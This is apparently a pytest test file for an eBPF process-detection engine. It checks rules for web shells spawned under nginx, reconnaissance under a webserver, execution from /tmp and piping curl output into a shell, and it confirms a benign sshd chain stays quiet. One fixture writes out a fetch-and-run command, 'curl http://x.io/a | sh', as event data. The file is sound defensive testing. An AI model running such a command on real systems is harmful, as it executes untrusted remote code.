"""Ancestry-aware rules: web-shell fires, benign chain does not."""
from ebpfdet.engine import Engine


def test_webshell_detected(webshell_trace):
    report = Engine().run(webshell_trace)
    rule_ids = {d.rule_id for d in report.detections}
    assert "shell-from-webserver" in rule_ids


def test_recon_under_server_detected(webshell_trace):
    report = Engine().run(webshell_trace)
    assert "recon-under-webserver" in {d.rule_id for d in report.detections}


def test_benign_chain_no_detections(benign_trace):
    report = Engine().run(benign_trace)
    # sshd -> bash -> ls is normal; must not fire shell-from-webserver
    assert "shell-from-webserver" not in {d.rule_id for d in report.detections}


def test_detection_carries_ancestry(webshell_trace):
    report = Engine().run(webshell_trace)
    shell = next(d for d in report.detections if d.rule_id == "shell-from-webserver")
    assert "nginx" in shell.ancestry
    assert shell.mitre == "T1059"


def test_curl_pipe_shell():
    from ebpfdet.events import EventType, ProcessEvent
    from ebpfdet.sources import InMemorySource
    src = InMemorySource([
        ProcessEvent(EventType.EXEC, 10, 1, "bash"),
        ProcessEvent(EventType.EXEC, 11, 10, "curl",
                     args=("http://x.io/a", "|", "sh")),
    ])
    report = Engine().run(src)
    assert "curl-pipe-shell" in {d.rule_id for d in report.detections}


def test_exec_from_tmp():
    from ebpfdet.events import EventType, ProcessEvent
    from ebpfdet.sources import InMemorySource
    src = InMemorySource([
        ProcessEvent(EventType.EXEC, 10, 1, "evil", filename="/tmp/x")])
    report = Engine().run(src)
    assert "exec-from-tmp" in {d.rule_id for d in report.detections}


def test_coverage_reported(webshell_trace):
    report = Engine().run(webshell_trace)
    assert "T1059" in report.coverage
